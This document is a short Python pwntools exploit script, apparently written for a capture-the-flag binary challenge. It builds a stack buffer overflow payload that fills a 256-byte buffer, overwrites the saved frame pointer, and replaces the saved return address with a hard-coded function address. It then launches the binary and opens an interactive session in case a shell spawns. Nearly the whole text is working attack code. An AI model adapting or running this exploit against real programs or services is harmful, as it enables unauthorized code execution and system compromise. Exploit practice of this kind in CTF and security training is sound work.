#!/usr/bin/env python3
from pwn import *
import sys

# -------------------------
# Config
# -------------------------
BINARY_PATH = "./main"
TARGET_ADDR = 0x401175   # address of gadgets (from your nm/objdump)
LOCAL = True             # set False and use remote() below for remote exploitation

# -------------------------
# Setup
# -------------------------
context.binary = BINARY_PATH
context.log_level = "info"   # change to "debug" for more verbosity

elf = ELF(BINARY_PATH)

# Quick sanity checks
if elf.pie:
    log.warn("Binary is PIE. Hard-coded address may not work.")
else:
    log.info("Binary is NOT PIE â€” using fixed addresses is appropriate.")

# -------------------------
# Build payload
# -------------------------
# Buffer layout:
# [256 bytes buffer][8 bytes saved RBP][8 bytes saved RIP]
payload  = b"A" * 256          # fill local_108 (256 bytes)
payload += b"B" * 8            # overwrite saved RBP (8 bytes)
payload += p64(TARGET_ADDR)    # overwrite RIP -> gadgets()

log.info(f"Payload length = {len(payload)} bytes")

# -------------------------
# Launch target
# -------------------------
if LOCAL:
    p = process(BINARY_PATH)
else:
    # Example remote usage:
    # p = remote("challenge.host", 1337)
    # Uncomment and edit above line to use remote target.
    raise SystemExit("Set LOCAL=True to run locally or set up remote connection code.")

# Optionally send a newline first (not necessary here) and then payload
p.send(payload)

# Give you an interactive session (if gadgets spawns shell or prints flag)
p.interactive()
